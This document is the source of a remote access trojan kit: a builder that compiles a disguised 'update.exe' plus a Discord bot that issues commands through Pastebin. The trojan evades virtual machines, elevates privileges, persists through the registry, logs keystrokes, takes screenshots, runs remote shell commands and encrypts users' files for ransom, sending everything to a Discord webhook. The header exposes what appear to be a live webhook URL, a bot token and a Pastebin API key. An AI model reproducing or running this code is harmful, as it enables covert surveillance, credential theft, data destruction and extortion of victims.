pip install requests pillow pynput cryptography pywin32 pyinstaller pyperclip discord.py

https://discord.com/api/webhooks/1453489886308073522/o9Bg9jBIWlj8nUGlYdMWHlLALtzIoIedkwtioTFgFPVX3SEo7WeolqoqEvZUbSA1W1JB

MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GSV3BK.YJhYzr25_Tef s0VAH5VMeZnEPCvJXyKZ5JlNVU

server id = 1264299849063333919

Channel id = 1264299849604661331

https://pastebin.com/raw/m5U6eger

pastebin key = mGiXZ4yQB6I4SArToIF1bs6v7fZPv9Fc


import os
import subprocess
import shutil

webhook_url = input("Discord webhook URL: ").strip()
command_url = input("Pastebin raw URL (with {}): ").strip()
output_name = "update.exe"

rat_code = f'''
import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import winreg

WEBHOOK_URL = "{webhook_url}"
COMMAND_URL = "{command_url}"
POLL_INTERVAL = 15
VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
KEYLOG_BUFFER = ""

def send(msg="", embed=None, file=None):
    if msg: msg = f"[{{VICTIM_ID}}] {{msg}}"
    if embed and "title" in embed: embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
    data = {{"content": msg}}
    if embed: data["embeds"] = [embed]
    files = {{"file": file}} if file else None
    try: requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
    except: pass

def info():
    try: ip = requests.get("https://api.ipify.org", timeout=5).text
    except: ip = "Unknown"
    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
    send(embed=embed)

def anti_vm():
    try:
        if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
            sys.exit(0)
    except: pass

def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except: pass

def on_press(key):
    global KEYLOG_BUFFER
    try: KEYLOG_BUFFER += key.char
    except: KEYLOG_BUFFER += f" [{{str(key)}}] "
    if len(KEYLOG_BUFFER) > 500:
        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
        KEYLOG_BUFFER = ""

def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    send("Screenshot", file=("ss.png", buf, "image/png"))

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    send("Workstation locked")

def disable_tm():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        send("Task Manager disabled")
    except: pass

def enable_tm():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        send("Task Manager enabled")
    except: pass

def bsod():
    send("Triggering BSOD...")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def encrypt(path=os.path.expanduser("~\\Desktop")):
    key = Fernet.generate_key()
    f = Fernet(key)
    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
    count = 0
    exts = (".docx",".pdf",".jpg",".png",".txt",".xlsx")
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(exts):
                fp = os.path.join(root, file)
                try:
                    with open(fp,"rb") as d: enc = f.encrypt(d.read())
                    with open(fp+".locked","wb") as o: o.write(enc)
                    os.remove(fp)
                    count += 1
                except: pass
    send(f"Encrypted {{count}} files")

def shell(cmd):
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e: out = str(e)
    send(f"Shell output:\\n{{out[:3000]}}")

def poll():
    while True:
        try:
            cmds = requests.get(COMMAND_URL, timeout=10).json()
            if str(VICTIM_ID) in cmds:
                full = cmds[str(VICTIM_ID)].strip()
                parts = full.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                if cmd in ["ss","screenshot"]: screenshot()
                elif cmd == "lock": lock_pc()
                elif cmd == "disabletm": disable_tm()
                elif cmd == "enabletm": enable_tm()
                elif cmd == "bsod": bsod()
                elif cmd == "encrypt": encrypt(arg or None)
                elif cmd == "shell": shell(arg)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    anti_vm()
    elevate()
    persist()
    info()
    threading.Thread(target=poll, daemon=True).start()
    with Listener(on_press=on_press) as l:
        l.join()
'''

with open("rat.py", "w") as f: f.write(rat_code)

print("Building bulletproof EXE...")
subprocess.run([
    "pyinstaller","--onefile","--noconsole",
    "--collect-all","pynput",
    "--hidden-import=pynput.keyboard._win32",
    "--hidden-import=pynput._util.win32",
    "--name",output_name,"rat.py"
])

shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)
os.remove("rat.py") if os.path.exists("rat.py") else None
os.remove("rat.spec") if os.path.exists("rat.spec") else None

print(f"EXE ready: dist\\{output_name}")




import discord
from discord.ext import commands
import re
import json
import requests

TOKEN = "YOUR_BOT_TOKEN_HERE"
GUILD_ID = 123456789012345678      # Server ID
PASTEBIN_DEV_KEY = "YOUR_PASTEBIN_DEV_KEY_HERE"  # The unique one you put in

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="-", intents=intents)

known_victims = set()

def queue_command(victim_id, full_cmd):
    # Always create fresh paste
    data = {
        "api_dev_key": PASTEBIN_DEV_KEY,
        "api_option": "paste",
        "api_paste_code": json.dumps({victim_id: full_cmd}),
        "api_paste_private": "1",  # Unlisted
        "api_paste_name": "rat_cmds",
        "api_paste_expire_date": "N"
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if "pastebin.com" in response.text:
        new_url = response.text.strip()
        new_raw = new_url.replace("pastebin.com/", "pastebin.com/raw/")
        print(f"[+] New command paste: {new_url}")
        print(f"[+] New RAW URL for RAT rebuild: {new_raw}")
        return new_raw
    else:
        print("[-] Pastebin error:", response.text)
        return None

async def create_victim_section(victim_id):
    guild = bot.get_guild(GUILD_ID)
    if not guild: return None
    
    category_name = f"Victim-{victim_id}"
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)
    
    channel_name = f"logs-{victim_id}"
    channel = discord.utils.get(category.text_channels, name=channel_name)
    if not channel:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        channel = await category.create_text_channel(channel_name, overwrites=overwrites)
    
    return channel

@bot.event
async def on_ready():
    print(f"[+] {bot.user} online - type -ss in victim channels")

@bot.event
async def on_message(message):
    if message.author.bot: return
    
    # Detect new bite in main webhook channel
    if "WE GOT A BITE CAPTAIN" in (message.content + " ".join([e.title or "" + e.description or "" for e in message.embeds])):
        match = re.search(r"\[([a-f0-9]{8})\]|Victim ID.*?([a-f0-9]{8})", message.content + " ".join([e.description or "" for e in message.embeds]), re.IGNORECASE)
        if match:
            victim_id = match.group(1) or match.group(2)
            if victim_id not in known_victims:
                known_victims.add(victim_id)
                channel = await create_victim_section(victim_id)
                if channel:
                    await message.reply(f"**BITE** - Victim **{victim_id}** hooked\nWar room: {channel.mention}")

    # Commands in victim channels
    if message.channel.name.startswith("logs-"):
        match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
        if match and message.content.startswith("-"):
            victim_id = match.group(1)
            cmd_parts = message.content[1:].strip().split(" ", 1)
            command = cmd_parts[0].lower()
            arg = cmd_parts[1] if len(cmd_parts) > 1 else ""
            full_cmd = command + (" " + arg if arg else "")
            
            new_raw = queue_command(victim_id, full_cmd)
            if new_raw:
                await message.reply(f"**{full_cmd}** queued for **{victim_id}**\n**REBUILD RAT WITH THIS RAW URL:**\n{new_raw}")
            else:
                await message.reply("Pastebin shat itself - check console")

    await bot.process_commands(message)

bot.run(TOKEN)
